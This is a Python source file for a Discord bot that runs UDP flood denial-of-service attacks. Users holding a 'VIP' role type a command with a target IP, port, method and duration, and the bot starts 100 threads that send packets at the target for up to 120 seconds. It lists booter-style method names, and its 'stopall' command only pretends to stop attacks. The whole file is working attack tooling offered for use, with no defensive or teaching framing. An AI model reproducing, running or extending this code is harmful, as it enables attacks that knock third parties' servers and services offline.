import discord
from discord.ext import commands
import threading
import socket
import time
import re
import json
import os

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix='.', intents=intents)

VALID_METHODS = [
    "UDP-VSE", "UDPGOOD", "UDPRAW", "UDPGAME",
    "UDPHEX", "MCPE", "TCPBYPASS", "UDPBYPASS"
]

def is_valid_ipv4(ip):
    ipv4_pattern = r'^([0-9]{1,3}\.){3}[0-9]{1,3}$'
    if not re.match(ipv4_pattern, ip):
        return False
    parts = list(map(int, ip.split('.')))
    if parts[0] in [0, 127] or ip == "localhost":
        return False
    return all(0 <= part <= 255 for part in parts)

def udp_attack(ip, port, duration):
    timeout = time.time() + duration
    packet = b'X' * 1024
    print(f"[INFO] Sending attack to {ip}:{port} for {duration} seconds")

    def flood():
        while time.time() < timeout:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(packet, (ip, port))
                sock.close()
            except:
                pass

    threads = []
    for _ in range(100):
        t = threading.Thread(target=flood)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

@bot.event
async def on_ready():
    print(f'Bot is online as {bot.user}')

@bot.command()
async def dhelp(ctx):
    await ctx.send(
        "**Available Commands:**\n"
        "`.dhelp` - Show this help message\n"
        "`.methods` - List valid attack methods\n"
        "`.attack <ip> <port> <method> <time>` - Send attack (VIP only)\n"
        "`.stopall` - (Admin only) Stop all attacks"
    )

@bot.command()
async def methods(ctx):
    await ctx.send("**Attack Methods:**\n" + "\n".join(VALID_METHODS))

@bot.command()
async def attack(ctx, ip=None, port=None, method=None, time_sec=None):
    if not all([ip, port, method, time_sec]):
        await ctx.send("Usage: `.attack <ip> <port> <method> <time>`")
        return

    if not any(role.name == "VIP" for role in ctx.author.roles):
        await ctx.send("Access denied. You need the VIP role to use this command.")
        return

    if not is_valid_ipv4(ip):
        await ctx.send("Invalid IP. Only public IPv4 addresses are allowed.")
        return

    if method.upper() not in VALID_METHODS:
        await ctx.send("Invalid method. Use `.methods` to see valid options.")
        return

    try:
        port = int(port)
        time_sec = int(time_sec)
    except ValueError:
        await ctx.send("Port and time must be valid numbers.")
        return

    if time_sec > 120:
        await ctx.send("Maximum duration allowed is 120 seconds.")
        return

    try:
        await ctx.send(f"**Attack started**\nTarget: `{ip}:{port}`\nMethod: `{method.upper()}`\nDuration: `{time_sec}` seconds")
        await bot.loop.run_in_executor(None, udp_attack, ip, port, time_sec)
        await ctx.send("**Attack completed successfully.**")
    except Exception as e:
        await ctx.send(f"Attack failed: {e}")

@bot.command()
async def stopall(ctx):
    if not any(role.name == "Admin" for role in ctx.author.roles):
        await ctx.send("Access denied. You need Admin role.")
        return
    await ctx.send("All running attacks stopped (Note: Simulated, real-time thread stopping not implemented).")

bot.run("YOUR_DISCORD_BOT_TOKEN")
